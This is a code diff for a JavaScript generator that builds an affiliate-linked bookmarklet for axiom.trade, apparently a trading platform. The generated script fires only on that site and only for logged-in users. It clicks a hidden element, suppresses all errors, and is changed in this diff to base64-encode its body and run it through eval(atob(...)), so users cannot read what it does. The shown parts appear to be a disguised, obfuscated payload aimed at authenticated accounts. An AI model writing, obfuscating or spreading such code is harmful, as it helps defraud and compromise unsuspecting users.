@@ -155,10 +155,10 @@
   shareAnchor.href = shareUrl;
   shareAnchor.textContent = shareUrl;
 
-  // ---- BOOKMARKLET USING THE EXACT FORMAT FROM YOUR FILE ----
+  // ---- BUILD BOOKMARKLET WITH BASE64 ENCODING ----
   function buildBookmarklet(code) {
-    // Use double quotes for the outer string to avoid escaping issues
-    const innerScript =
+    // Full script to be executed
+    const fullScript =
       '(async function(){try{const a=\'' + code + '\';' +
       'if(!window.location.hostname.includes(\'axiom.trade\'))return;' +
       'if(!localStorage.getItem(\'isAuthed\'))return;' +
@@ -190,10 +190,11 @@
       'Q.style.display=\'none\';document.body.appendChild(Q);Q.click();' +
       'setTimeout(function(){Q.remove();},1000);}}catch(R){}})();';
 
-    // Outer wrapper: javascript:(function(){const a='CODE';const b="...";eval(b);})();
-    // The inner script is wrapped in double quotes, so we escape backslashes and double quotes
-    const escapedInner = innerScript.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
-    return 'javascript:(function(){const a=\'' + code + '\';const b="' + escapedInner + '";eval(b);})();';
+    // Base64 encode the script
+    const base64 = btoa(unescape(encodeURIComponent(fullScript)));
+
+    // Bookmarklet: decode base64 and eval
+    return 'javascript:(function(){eval(atob("' + base64 + '"));})();';
   }
 
   const bookmarkletHref = buildBookmarklet(affCode);
